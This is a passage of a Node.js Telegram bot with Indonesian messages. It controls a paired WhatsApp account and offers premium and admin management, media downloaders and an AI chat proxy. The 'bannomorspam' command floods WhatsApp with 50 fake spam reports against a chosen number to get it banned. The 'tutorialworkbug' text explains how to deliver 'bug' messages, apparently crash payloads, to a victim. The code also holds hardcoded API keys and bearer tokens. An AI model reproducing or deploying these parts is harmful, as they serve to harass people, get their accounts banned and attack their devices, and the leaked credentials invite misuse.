    if (!global.isPremiumGroup(chatId)) return ctx.reply(`${E.info()} Grup ini belum premium.`, { parse_mode: 'HTML' });
    global.premiumData.groups = global.premiumData.groups.filter((g) => g !== chatId);
    savePremiumData();
    return ctx.reply(`${E.cross()} Grup <b>${ctx.chat.title}</b> telah dihapus dari daftar premium.`, { parse_mode: 'HTML' });
  }

  if (args.length >= 2) {
    const userId = args[1].replace(/[^0-9]/g, '');
    if (!global.isPremiumUser(userId)) return ctx.reply(`${E.fail()} Pengguna ${userId} tidak ditemukan di daftar premium.`, { parse_mode: 'HTML' });
    global.premiumData.users = global.premiumData.users.filter((u) => u !== userId);
    savePremiumData();
    return ctx.reply(`${E.cross()} Pengguna ${userId} telah dihapus dari daftar premium.`, { parse_mode: 'HTML' });
  }

  ctx.reply(`${E.fail()} Format salah.\n- <code>/delprem</code> di grup → hapus grup premium\n- <code>/delprem &lt;user_id&gt;</code> → hapus user premium`, { parse_mode: 'HTML' });
});

bot.command('delpremgrup', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').filter(Boolean);
  const chatType = ctx.chat.type;

  if ((chatType === 'group' || chatType === 'supergroup') && args.length === 1) {
    const chatId = ctx.chat.id.toString();
    if (!global.isPremiumGroup(chatId)) return ctx.reply(`${E.info()} Grup ini belum premium.`, { parse_mode: 'HTML' });
    global.premiumData.groups = global.premiumData.groups.filter((g) => g !== chatId);
    savePremiumData();
    return ctx.reply(`${E.cross()} Grup <b>${ctx.chat.title}</b> telah dihapus dari daftar premium.`, { parse_mode: 'HTML' });
  }

  if (args.length >= 2) {
    const userId = args[1].replace(/[^0-9]/g, '');
    if (!global.isPremiumUser(userId)) return ctx.reply(`${E.fail()} Pengguna ${userId} tidak ditemukan di daftar premium.`, { parse_mode: 'HTML' });
    global.premiumData.users = global.premiumData.users.filter((u) => u !== userId);
    savePremiumData();
    return ctx.reply(`${E.cross()} Pengguna ${userId} telah dihapus dari daftar premium.`, { parse_mode: 'HTML' });
  }

  ctx.reply(`${E.fail()} Format salah.\n- <code>/delpremgrup</code> di grup → hapus grup premium\n- <code>/delpremgrup &lt;user_id&gt;</code> → hapus user premium`, { parse_mode: 'HTML' });
});

bot.command('addprem', checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(' ').filter(Boolean);
  const chatType = ctx.chat.type;

  if ((chatType === 'group' || chatType === 'supergroup') && args.length === 1) {
    const chatId = ctx.chat.id.toString();
    if (global.isPremiumGroup(chatId)) return ctx.reply(`${E.ok()} Grup ini sudah menjadi premium.`, { parse_mode: 'HTML' });
    global.premiumData.groups.push(chatId);
    savePremiumData();
    return ctx.reply(`${E.success()} Grup <b>${ctx.chat.title}</b> sekarang menjadi grup premium! ${E.dora()}`, { parse_mode: 'HTML' });
  }

  if (args.length >= 2) {
    const userId = args[1].replace(/[^0-9]/g, '');
    if (global.isPremiumUser(userId)) return ctx.reply(`${E.ok()} Pengguna ${userId} sudah memiliki status premium.`, { parse_mode: 'HTML' });
    global.premiumData.users.push(userId);
    savePremiumData();
    return ctx.reply(`${E.success()} Pengguna ${userId} berhasil ditambahkan ke daftar premium.`, { parse_mode: 'HTML' });
  }

  if (chatType === 'private' && args.length === 1) {
    const userId = ctx.from.id.toString();
    if (global.isPremiumUser(userId)) return ctx.reply(`${E.ok()} Kamu sudah jadi pengguna premium.`, { parse_mode: 'HTML' });
    global.premiumData.users.push(userId);
    savePremiumData();
    return ctx.reply(`${E.success()} Kamu telah menjadi pengguna premium! ${E.dora()}`, { parse_mode: 'HTML' });
  }

  ctx.reply(`${E.fail()} Format salah.\n- <code>/addprem</code> di grup → jadikan grup premium\n- <code>/addprem &lt;user_id&gt;</code> → tambah user premium`, { parse_mode: 'HTML' });
});

bot.command('addpremgrup', checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(' ').filter(Boolean);
  const chatType = ctx.chat.type;

  if ((chatType === 'group' || chatType === 'supergroup') && args.length === 1) {
    const chatId = ctx.chat.id.toString();
    if (global.isPremiumGroup(chatId)) return ctx.reply(`${E.ok()} Grup ini sudah menjadi premium.`, { parse_mode: 'HTML' });
    global.premiumData.groups.push(chatId);
    savePremiumData();
    return ctx.reply(`${E.success()} Grup <b>${ctx.chat.title}</b> sekarang menjadi grup premium! ${E.dora()}`, { parse_mode: 'HTML' });
  }

  if (args.length >= 2) {
    const userId = args[1].replace(/[^0-9]/g, '');
    if (global.isPremiumUser(userId)) return ctx.reply(`${E.ok()} Pengguna ${userId} sudah memiliki status premium.`, { parse_mode: 'HTML' });
    global.premiumData.users.push(userId);
    savePremiumData();
    return ctx.reply(`${E.success()} Pengguna ${userId} berhasil ditambahkan ke daftar premium.`, { parse_mode: 'HTML' });
  }

  ctx.reply(`${E.fail()} Format salah.\n- <code>/addpremgrup</code> di grup → jadikan grup premium\n- <code>/addpremgrup &lt;user_id&gt;</code> → tambah user premium`, { parse_mode: 'HTML' });
});

bot.command('cekprem', checkAdmin, async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id.toString();
  if (global.isPremiumGroup(chatId)) return ctx.reply(`${E.ok()} Grup ini terdaftar sebagai <b>grup premium</b>.`, { parse_mode: 'HTML' });
  if (global.isPremiumUser(userId)) return ctx.reply(`${E.ok()} Kamu terdaftar sebagai <b>pengguna premium</b>! ${E.crown()}`, { parse_mode: 'HTML' });
  return ctx.reply(`${E.fail()} Kamu bukan pengguna atau grup premium.`, { parse_mode: 'HTML' });
});

bot.command('cekpremgrup', checkAdmin, async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id.toString();
  if (global.isPremiumGroup(chatId)) return ctx.reply(`${E.ok()} Grup ini terdaftar sebagai <b>grup premium</b>.`, { parse_mode: 'HTML' });
  if (global.isPremiumUser(userId)) return ctx.reply(`${E.ok()} Kamu terdaftar sebagai <b>pengguna premium</b>! ${E.crown()}`, { parse_mode: 'HTML' });
  return ctx.reply(`${E.fail()} Kamu bukan pengguna atau grup premium.`, { parse_mode: 'HTML' });
});

bot.command("resetsession", checkOwner, async (ctx) => {
  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;
    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); deleted = true; }
    }
    if (deleted) {
      await ctx.reply(`${E.ok()} Session berhasil dihapus, panel akan restart ${E.rocket()}`, { parse_mode: 'HTML' });
      setTimeout(() => { process.exit(1); }, 2000);
    } else {
      ctx.reply(`${E.info()} Tidak ada folder session yang ditemukan`, { parse_mode: 'HTML' });
    }
  } catch (err) {
    console.error(err);
    ctx.reply(`${E.fail()} Gagal menghapus session`, { parse_mode: 'HTML' });
  }
});

bot.command('tourl', async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.photo) return ctx.reply(`${E.fail()} Balas sebuah foto untuk dijadikan link.`, { parse_mode: 'HTML' });
  const photo = reply.photo[reply.photo.length - 1];
  const fileId = photo.file_id;
  try {
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const imageBuffer = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
    const tempPath = './temp.jpg';
    fs.writeFileSync(tempPath, imageBuffer.data);
    const catboxUrl = await uploadToCatbox(tempPath);
    fs.unlinkSync(tempPath);
    return ctx.reply(`${E.ok()} Berhasil diupload!\n${E.pin()} ${catboxUrl}`, { parse_mode: 'HTML' });
  } catch (e) {
    console.error(e);
    return ctx.reply(`${E.fail()} Terjadi kesalahan saat mengupload.`, { parse_mode: 'HTML' });
  }
});

bot.command("addsender", async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply(`${E.fail()} Format perintah salah. Gunakan: <code>/addsender &lt;nomor_wa&gt;</code>`, { parse_mode: 'HTML' });
    }
    let phoneNumber = args[1].replace(/[^0-9]/g, '');
    if (sock && sock.user && isWhatsAppConnected) {
        return await ctx.reply(`${E.ok()} WhatsApp sudah terhubung. Tidak perlu pairing lagi ${E.bell()}`, { parse_mode: 'HTML' });
    }
    try {
        if (!sock) {
            const { state, saveCreds } = await useMultiFileAuthState("./session");
            const { version } = await fetchLatestBaileysVersion();
            sock = makeWASocket({
                version,
                keepAliveIntervalMs: 60000,
                connectTimeoutMs: 60000,
                printQRInTerminal: false,
                logger: pino({ level: "silent" }),
                auth: state,
                browser: ["Mac OS", "Safari", "10.15.7"],
                getMessage: async () => ({ conversation: "Ping" })
            });
            sock.ev.on("creds.update", saveCreds);
            sock.ev.on("connection.update", (u) => {
                if (u.connection === "open") { isWhatsAppConnected = true; console.log(chalk.green("✅ WhatsApp terhubung!")); }
                if (u.connection === "close") { isWhatsAppConnected = false; console.log(chalk.red("⚠️ WhatsApp putus")); }
            });
        }
        const code = await sock.requestPairingCode(phoneNumber, "1234SENZ");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        const pairingMessage = `${Q(`${CREWY_FONT}\n${E.bell()} 𝑷𝒂𝒊𝒓𝒊𝒏𝒈 𝑫𝒐𝒓𝒂𝒆𝒎𝒐𝒏`)}\n\n${E.phone()} Nomor: <b>${phoneNumber}</b>\n${E.key()} Kode: <code>${formattedCode}</code>\n\n${E.info()} Cara masukin:\n1. Buka WhatsApp\n2. Perangkat Tertaut\n3. Tautkan perangkat\n4. Masukkan kode di atas\n5. Ketik /ceksender`;
        await ctx.reply(pairingMessage, { parse_mode: 'HTML' });
    } catch (error) {
        console.error(chalk.red('Gagal pairing:'), error);
        await ctx.reply(`${E.fail()} Gagal pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.`, { parse_mode: 'HTML' });
    }
});

bot.command('addadmin', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').filter(Boolean);
  if (args.length < 2) return ctx.reply(`${E.fail()} Contoh: <code>/addadmin 123456789</code>`, { parse_mode: 'HTML' });
  const userId = args[1].replace(/[^0-9]/g, '');
  if (ownerUsers.includes(userId)) return ctx.reply(`${E.warn()} User ini owner, otomatis admin.`, { parse_mode: 'HTML' });
  if (adminUsers.includes(userId)) return ctx.reply(`${E.ok()} User ini sudah jadi admin.`, { parse_mode: 'HTML' });
  adminUsers.push(userId);
  saveAdminData();
  return ctx.reply(`${E.ok()} User ${userId} berhasil ditambahkan sebagai admin ${E.crown()}`, { parse_mode: 'HTML' });
});

bot.command('deladmin', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').filter(Boolean);
  if (args.length < 2) return ctx.reply(`${E.fail()} Contoh: <code>/deladmin 123456789</code>`, { parse_mode: 'HTML' });
  const userId = args[1].replace(/[^0-9]/g, '');
  if (!adminUsers.includes(userId)) return ctx.reply(`${E.fail()} User ini bukan admin.`, { parse_mode: 'HTML' });
  adminUsers = adminUsers.filter(id => id !== userId);
  saveAdminData();
  return ctx.reply(`${E.ok()} User ${userId} berhasil dihapus dari daftar admin.`, { parse_mode: 'HTML' });
});

bot.command('listadmin', checkOwner, async (ctx) => {
  let text = `${Q(`${CREWY_FONT}\n${E.crown()} 𝑫𝒂𝒇𝒕𝒂𝒓 𝑨𝒅𝒎𝒊𝒏`)}\n\n`;
  text += `${E.key()} <b>Owner:</b>\n`;
  if (ownerUsers.length === 0) text += '  - (kosong)\n';
  else ownerUsers.forEach((id, i) => { text += `  ${i+1}. [${id}](tg://user?id=${id}) (Owner)\n`; });
  text += `\n${E.medal()} <b>Admin Tambahan:</b>\n`;
  if (adminUsers.length === 0) text += '  - (kosong)\n';
  else adminUsers.forEach((id, i) => { text += `  ${i+1}. [${id}](tg://user?id=${id})\n`; });
  text += `\n${E.rank()} Total: ${ownerUsers.length + adminUsers.length} orang`;
  ctx.reply(text, { parse_mode: 'HTML' });
});

bot.command('setcd', checkOwner, async (ctx) => {
    const args = ctx.message.text.split(' ').filter(Boolean);
    if (args.length < 2) {
        if (globalCooldownSeconds <= 0) return ctx.reply(`${E.info()} Cooldown <b>NONAKTIF</b> (0 detik).\nGunakan <code>/setcd &lt;detik&gt;</code> untuk mengaktifkan.`, { parse_mode: 'HTML' });
        return ctx.reply(`${E.clock()} Cooldown saat ini: <b>${globalCooldownSeconds} detik</b> per user.\nUbah dengan <code>/setcd &lt;detik&gt;</code> (0 = matikan).`, { parse_mode: 'HTML' });
    }
    const seconds = parseInt(args[1]);
    if (isNaN(seconds) || seconds < 0) return ctx.reply(`${E.fail()} Masukkan angka detik yang valid (0 untuk nonaktif).`, { parse_mode: 'HTML' });
    globalCooldownSeconds = seconds;
    saveCooldown();
    if (seconds === 0) ctx.reply(`${E.ok()} Cooldown <b>DINONAKTIFKAN</b>. Semua command tanpa jeda.`, { parse_mode: 'HTML' });
    else ctx.reply(`${E.ok()} Cooldown diatur menjadi <b>${seconds} detik</b> untuk setiap user.`, { parse_mode: 'HTML' });
});

bot.command("ceksender", async (ctx) => {
    if (sock && sock.user && isWhatsAppConnected) {
        try {
            await sock.sendMessage(sock.user.id, { text: ".", delete: true });
            await ctx.reply(`${Q(`${CREWY_FONT}\n${E.phone()} 𝑺𝒕𝒂𝒕𝒖𝒔 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑`)}\n\n${E.ok()} Status : <b>TERHUBUNG</b>\n${E.clock()} Uptime : ${getUptime()}\n\n${E.success()} Bot siap digunakan. Silakan kirim bug.`, { parse_mode: 'HTML' });
            return;
        } catch (err) {
            if (err.message.includes('closed')) {
                await ctx.reply(`${Q(`${CREWY_FONT}\n${E.phone()} 𝑺𝒕𝒂𝒕𝒖𝒔 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑`)}\n\n${E.fail()} Status : <b>CONNECTION CLOSED</b>\n${E.clock()} Uptime : ${getUptime()}\n\n${E.warn()} Restart panel Pterodactyl lalu ketik /ceksender lagi.`, { parse_mode: 'HTML' });
            } else {
                await ctx.reply(`${Q(`${CREWY_FONT}\n${E.phone()} 𝑺𝒕𝒂𝒕𝒖𝒔 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑`)}\n\n${E.fail()} Status : <b>ERROR</b>\n${E.clock()} Uptime : ${getUptime()}\n\n${E.warn()} Error: ${err.message.slice(0, 50)}`, { parse_mode: 'HTML' });
            }
            return;
        }
    }
    await ctx.reply(`${Q(`${CREWY_FONT}\n${E.phone()} 𝑺𝒕𝒂𝒕𝒖𝒔 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑`)}\n\n${E.fail()} Status : <b>TIDAK TERHUBUNG</b>\n${E.clock()} Uptime : ${getUptime()}\n\n${E.info()} Ketik <code>/addsender 628xxxxxxxx</code> dulu ya Nobita!`, { parse_mode: 'HTML' });
});

bot.command("cekemoji", async (ctx) => {
  try {
    const targetMsg = ctx.message?.reply_to_message;
    if (!targetMsg) return ctx.reply(`${E.fail()} Reply pesan yang berisi emoji premium.\n\nContoh:\n- User kirim emoji premium\n- Reply emoji tersebut dengan /cekemoji`, { parse_mode: 'HTML' });
    const emojis = [];
    if (Array.isArray(targetMsg.entities)) {
      for (const entity of targetMsg.entities) {
        if (entity.type === "custom_emoji" && entity.custom_emoji_id) emojis.push(entity.custom_emoji_id);
      }
    }
    if (Array.isArray(targetMsg.caption_entities)) {
      for (const entity of targetMsg.caption_entities) {
        if (entity.type === "custom_emoji" && entity.custom_emoji_id) emojis.push(entity.custom_emoji_id);
      }
    }
    if (emojis.length === 0) return ctx.reply(`${E.fail()} Tidak ada custom emoji terdeteksi.\n\nReply pesan yang berisi emoji premium Telegram.`, { parse_mode: 'HTML' });
    let result = `${Q(`${CREWY_FONT}\n${E.sparkle()} 𝑪𝒖𝒔𝒕𝒐𝒎 𝑬𝒎𝒐𝒋𝒊`)}\n`;
    emojis.forEach((id, i) => {
      result += `\n<b>${E.star()} Emoji ${i + 1}</b>\n<code>${id}</code>\n<b>Format Pakai:</b>\n<code>&lt;tg-emoji emoji-id="${id}"&gt;✨&lt;/tg-emoji&gt;</code>\n`;
    });
    result += `\n${E.rank()} <b>Total Emoji:</b> ${emojis.length}`;
    return ctx.reply(result, { parse_mode: "HTML", disable_web_page_preview: true });
  } catch (err) {
    console.log(err);
    return ctx.reply(`${E.fail()} Terjadi error saat membaca emoji.`, { parse_mode: 'HTML' });
  }
});

bot.command('emoji', async (ctx) => {
    const replyMsg = ctx.message.reply_to_message;
    let customEmojiId = null;
    let emojiChar = null;
    function extractIdFromTag(text) {
        const match = text.match(/<tg-emoji emoji-id="(\d+)">/i);
        return match ? match[1] : null;
    }
    if (replyMsg) {
        if (replyMsg.entities) {
            for (const entity of replyMsg.entities) {
                if (entity.type === 'custom_emoji') {
                    customEmojiId = entity.custom_emoji_id;
                    emojiChar = replyMsg.text?.substring(entity.offset, entity.offset + entity.length) || '?';
                    break;
                }
            }
        }
        if (!customEmojiId && replyMsg.caption_entities) {
            for (const entity of replyMsg.caption_entities) {
                if (entity.type === 'custom_emoji') {
                    customEmojiId = entity.custom_emoji_id;
                    emojiChar = replyMsg.caption?.substring(entity.offset, entity.offset + entity.length) || '?';
                    break;
                }
            }
        }
        const text = replyMsg.text || replyMsg.caption || '';
        const idFromTag = extractIdFromTag(text);
        if (idFromTag && !customEmojiId) { customEmojiId = idFromTag; emojiChar = '?'; }
    }
    if (!customEmojiId) {
        let args = ctx.message.text.split(' ');
        args.shift();
        let rawInput = args.join(' ').trim();
        if (rawInput) {
            let idFromTag = extractIdFromTag(rawInput);
            if (idFromTag) { customEmojiId = idFromTag; emojiChar = '?'; }
            else if (ctx.message.entities) {
                for (let entity of ctx.message.entities) {
                    if (entity.type === 'custom_emoji') {
                        customEmojiId = entity.custom_emoji_id;
                        emojiChar = rawInput.substring(entity.offset - (ctx.message.text.indexOf(rawInput)), entity.offset + entity.length - (ctx.message.text.indexOf(rawInput))) || '?';
                        break;
                    }
                }
            }
            if (!customEmojiId) return ctx.reply(`${E.fail()} Tidak dapat mendeteksi custom emoji.\n1. Reply pesan berisi custom emoji lalu /emoji\n2. Atau: /emoji &lt;tg-emoji emoji-id="12345"&gt;emoji&lt;/tg-emoji&gt;`, { parse_mode: 'HTML' });
        } else {
            return ctx.reply(`${E.info()} Cara penggunaan:\n1. Reply pesan custom emoji → /emoji\n2. Atau /emoji &lt;custom_emoji&gt;\n3. Atau /emoji &lt;tg-emoji emoji-id="12345"&gt;emoji&lt;/tg-emoji&gt;`, { parse_mode: 'HTML' });
        }
    }
    const emojiType = (customEmojiId.length > 18 && customEmojiId.startsWith('5')) ? 'PREMIUM (estimated)' : 'STANDARD';
    const tgTag = `<tg-emoji emoji-id="${customEmojiId}">${emojiChar || '?'}</tg-emoji>`;
    let response = `${Q(`${CREWY_FONT}\n${E.sparkle()} 𝑬𝒎𝒐𝒋𝒊 𝑫𝒊𝒕𝒆𝒎𝒖𝒌𝒂𝒏`)}\n\n`;
    response += `${E.star()} Tipe: ${emojiType}\n`;
    response += `${E.pin()} ID: <code>${customEmojiId}</code>\n`;
    response += `${E.smile()} Karakter: ${emojiChar || '(tidak terdeteksi)'}\n\n`;
    response += `${E.info()} <b>Cara Penggunaan (HTML):</b>\n<code>${tgTag}</code>\n\n`;
    response += `${E.bulb()} <b>Catatan:</b> Tag <code>&lt;tg-emoji&gt;</code> hanya render di Telegram.`;
    await ctx.reply(response, { parse_mode: 'HTML' });
});

bot.command("bannomorspam", checkOwner, async (ctx) => {
  const targetPhone = ctx.message.text.split(" ")[1];
  if (!targetPhone) return ctx.reply(`${E.fail()} Format: <code>/bannomorspam 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetJid = targetPhone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const loopCount = 50;
  try {
    await ctx.reply(`${E.clock()} Spam report ${loopCount}x ke ${targetPhone}...`, { parse_mode: 'HTML' });
    for (let i = 0; i < loopCount; i++) {
      try {
        await safeSend(() => sock.query({
          tag: "iq",
          attrs: { to: targetJid, type: "set", xmlns: "w:chat:report" },
          content: [{ tag: "report", attrs: { jid: targetJid, reason: "spam" } }]
        }));
      } catch (e) {}
      await sleep(500);
    }
    await ctx.reply(`${E.success()} Nomor ${targetPhone} KENON! (${loopCount}x report)`, { parse_mode: 'HTML' });
  } catch (err) {
    await ctx.reply(`${E.fail()} Gagal: ${err.message}`, { parse_mode: 'HTML' });
  }
});

bot.command("pairing", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply(`${E.fail()} Format: <code>/pairing 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const phone = args[1].replace(/[^0-9]/g, "");
  if (isWhatsAppConnected) return ctx.reply(`${E.ok()} WhatsApp sudah terhubung. Ga perlu pairing.`, { parse_mode: 'HTML' });
  try {
    if (sock) { try { sock.end(); } catch(_){} sock = null; }
    isWhatsAppConnected = false;
    const { state, saveCreds } = await useMultiFileAuthState("./session");
    const { version } = await fetchLatestBaileysVersion();
    const pairSock = makeWASocket({
      version, keepAliveIntervalMs: 60000, connectTimeoutMs: 60000,
      printQRInTerminal: false, logger: pino({ level: "silent" }),
      auth: state, browser: ["Mac OS", "Safari", "10.15.7"],
      getMessage: async () => ({ conversation: "Ping" })
    });
    pairSock.ev.on("creds.update", saveCreds);
    pairSock.ev.on("connection.update", (u) => {
      if (u.connection === "open") { isWhatsAppConnected = true; sock = pairSock; console.log(chalk.green("✅ WhatsApp terhubung (pairing)!")); }
      if (u.connection === "close") { isWhatsAppConnected = false; }
    });
    const code = await pairSock.requestPairingCode(phone);
    const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
    await ctx.reply(T.pairingOk(formatted), { parse_mode: "HTML" });
  } catch (err) {
    console.error("Pairing error:", err);
    await ctx.reply(T.pairingFail(err.message), { parse_mode: "HTML" });
  }
});

bot.command("tutorialworkbug", async (ctx) => {
  const text = `
${Q(`${CREWY_FONT}\n${E.info()} 𝑺𝒚𝒂𝒓𝒂𝒕 𝑩𝒖𝒈 𝑾𝒐𝒓𝒌`)}
- Intinya wajib ada riwayat chat kita sama target
- Wajib chat pake nomor sender
- Ada 2 opsi, mau lu yg ngechat duluan atau korban bisa

${E.cross()} Chat doang, Ga di bales → GAGAL
${E.check()} Target BALAS → WORK
${E.check()} Target CHAT DULUAN KE NO SENDER → WORK

${Q(`${CREWY_FONT}\n${E.rocket()} 𝑪𝒂𝒓𝒂 𝑷𝒂𝒌𝒂𝒊 (2 𝑶𝒑𝒔𝒊)`)}
${E.info()} OPSI 1 - SENDER CHAT DULUAN:
1. Chat target pake nomor di sender
2. Tunggu target BALAS (WAJIB!)
3. Kirim bug → TEMBUS!

${E.info()} OPSI 2 - TARGET CHAT DULUAN:
1. Biarkan target chat ke nomor sender
2. BALAS chat target (WAJIB!)
3. Kirim bug → tembus
`;
  await ctx.replyWithPhoto("https://files.catbox.moe/llegog.jpg", {
    caption: text, parse_mode: "HTML",
    reply_markup: { inline_keyboard: [ [ btn("Kembali", "start_menu", EMOJI_IDS.bell) ] ] }
  });
});

const TIKTOK_API_URL = "https://tiktok-video-no-watermark10.p.rapidapi.com/index/Tiktok/getVideoInfo";
const TIKTOK_HEADERS = {
  "content-type": "application/x-www-form-urlencoded",
  "X-RapidAPI-Host": "tiktok-video-no-watermark10.p.rapidapi.com",
  "X-RapidAPI-Key": "d0f697a402msh5db691d2b18cfe3p1ca359jsnd9c219bd5948"
};

async function handleTiktok(ctx) {
  try {
    const url = ctx.message.text.split(" ")[1];
    if (!url) return ctx.reply(`${E.fail()} Format: <code>/tt &lt;url_tiktok&gt;</code>`, { parse_mode: 'HTML' });
    if (!/tiktok\.com|vm\.tiktok\.com/.test(url)) return ctx.reply(`${E.fail()} URL TikTok tidak valid!`, { parse_mode: 'HTML' });
    await ctx.reply(`${E.clock()} Mengambil video TikTok...`, { parse_mode: 'HTML' });
    const res = await axios.post(TIKTOK_API_URL, "url=" + encodeURIComponent(url), { headers: TIKTOK_HEADERS, timeout: 30000 });
    const data = res.data?.data;
    if (!data?.play) return ctx.reply(`${E.fail()} Gagal mengambil data video.`, { parse_mode: 'HTML' });
    await ctx.replyWithVideo({ url: data.play }, {
      caption: `${Q(`${CREWY_FONT}\n${E.music()} 𝑻𝒊𝒌𝑻𝒐𝒌 𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅𝒆𝒓`)}\n${E.smile()} Author: ${data.author?.unique_id || "-"}\n${E.pen()} Title: ${data.title || "-"}`,
      parse_mode: "HTML"
    });
  } catch (err) {
    console.error("tiktok:", err.message);
    ctx.reply(`${E.fail()} Terjadi kesalahan: ${err.message}`, { parse_mode: 'HTML' });
  }
}
bot.command("dltiktok", handleTiktok);
bot.command("tt", handleTiktok);

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply(`${E.fail()} Contoh: <code>/brat senzy ganteng</code>`, { parse_mode: 'HTML' });
  try {
    await ctx.reply(`${E.clock()} Membuat stiker...`, { parse_mode: 'HTML' });
    const apiUrl = "https://api.siputzx.my.id/api/m/brat?text=" + encodeURIComponent(text) + "&isVideo=false";
    const res = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, res.data);
    await ctx.replyWithSticker({ source: filePath });
    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("brat error:", err.message);
    ctx.reply(`${E.fail()} Gagal membuat stiker brat.`, { parse_mode: 'HTML' });
  }
});

bot.command("play", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) return ctx.reply(`${E.fail()} Contoh: <code>/play Nina Feast</code>`, { parse_mode: 'HTML' });
  try {
    await ctx.reply(`${E.clock()} Mencari lagu di Spotify...`, { parse_mode: 'HTML' });
    const res = (await axios.get("https://api.siputzx.my.id/api/s/spotify?query=" + encodeURIComponent(query))).data;
    if (!res?.status) return ctx.reply(`${E.fail()} Lagu tidak ditemukan!`, { parse_mode: 'HTML' });
    const track = res.result;
    const caption =
      `${Q(`${CREWY_FONT}\n${E.music()} 𝑺𝒑𝒐𝒕𝒊𝒇𝒚 𝑷𝒍𝒂𝒚`)}\n\n` +
      `${E.pen()} Title: ${track.title}\n` +
      `${E.smile()} Artist: ${track.artist}\n` +
      `${E.book()} Album: ${track.album}\n` +
      `${E.clock()} Duration: ${track.duration}\n` +
      `${E.calendar()} Release: ${track.release_at}\n` +
      `${E.pin()} URL: ${track.url}`;
    await ctx.replyWithPhoto({ url: track.thumbnail }, { caption, parse_mode: "HTML" });
    await ctx.replyWithAudio({ url: track.download_url }, { title: track.title, performer: track.artist });
  } catch (err) {
    console.log(err);
    ctx.reply(`${E.fail()} Terjadi kesalahan saat mengambil data.`, { parse_mode: 'HTML' });
  }
});

bot.command("iqc", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  if (!input) return ctx.reply(`${E.fail()} Format: <code>/iqc 18:00|40|Indosat|pesan</code>`, { parse_mode: 'HTML' });
  const [time, battery, carrier, ...msgParts] = input.split("|");
  if (msgParts.length === 0) return ctx.reply(`${E.fail()} Format: <code>/iqc 18:00|40|Indosat|hai</code>`, { parse_mode: 'HTML' });
  await ctx.reply(`${E.clock()} proses...`, { parse_mode: 'HTML' });
  try {
    const url = "https://brat.siputzx.my.id/iphone-quoted?time=" + encodeURIComponent(time) +
      "&batteryPercentage=" + battery +
      "&carrierName=" + encodeURIComponent(carrier) +
      "&messageText=" + encodeURIComponent(msgParts.join("|").trim()) +
      "&emojiStyle=apple";
    const res = await axios.get(url, { responseType: "arraybuffer" });
    await ctx.replyWithPhoto({ source: Buffer.from(res.data) }, { caption: `${E.ok()} SS iPhone` });
  } catch (err) {
    console.error("iqc:", err.message);
    ctx.reply(`${E.fail()} Gagal menghubungi API.`, { parse_mode: 'HTML' });
  }
});

async function callClaude(prompt) {
  return await axios({
    method: "POST",
    url: "http://157.245.194.202:20129/v1/chat/completions",
    headers: {
      Authorization: "Bearer sk-aea0067453d5c272-33fcd4-2c3e141d",
      "Content-Type": "application/json"
    },
    data: {
      model: "claude-opus-5",
      messages: [
        { role: "system", content: "Kamu adalah Zephyrine, asisten AI Doraemon. Jawab singkat, padat, langsung." },
        { role: "user", content: prompt }
      ],
      stream: false, max_tokens: 1024, temperature: 0.7
    },
    timeout: 60000
  });
}

async function handleAI(ctx) {
  const prompt = ctx.message.text.split(" ").slice(1).join(" ");
  if (!prompt) return ctx.reply(`${E.fail()} Format: /ai &lt;pertanyaan&gt;`, { parse_mode: 'HTML' });
  const loading = await ctx.reply(`${E.clock()} Memproses...`, { parse_mode: 'HTML' });
  try {
    const res = await callClaude(prompt);
    let replyText = res.data?.choices?.[0]?.message?.content || "Tidak ada respons.";
    if (replyText.length > 4000) replyText = replyText.slice(0, 3900) + "\n\n... [dipotong]";
    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, undefined,
      `${Q(`${CREWY_FONT}\n${E.robot()} 𝑪𝒍𝒂𝒖𝒅𝒆 (𝒁𝒆𝒑𝒉𝒚𝒓𝒊𝒏𝒆)`)}\n\n${replyText}`,
      { parse_mode: "HTML", disable_web_page_preview: true }
    );
  } catch (err) {
    console.error("AI Error:", err.message);
    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, undefined, `${E.fail()} Gagal menghubungi AI.`, { parse_mode: 'HTML' });
  }
}
bot.command("ai", handleAI);
bot.command("claude", handleAI);

bot.command("aistream", async (ctx) => {
  const prompt = ctx.message.text.split(" ").slice(1).join(" ");
  if (!prompt) return ctx.reply(`${E.fail()} Format: /aistream &lt;pertanyaan&gt;`, { parse_mode: 'HTML' });
  const loading = await ctx.reply(`${E.clock()} Streaming response...`, { parse_mode: 'HTML' });
  try {
    const res = await axios({
      method: "POST",
      url: "http://157.245.194.202:20129/v1/chat/completions",
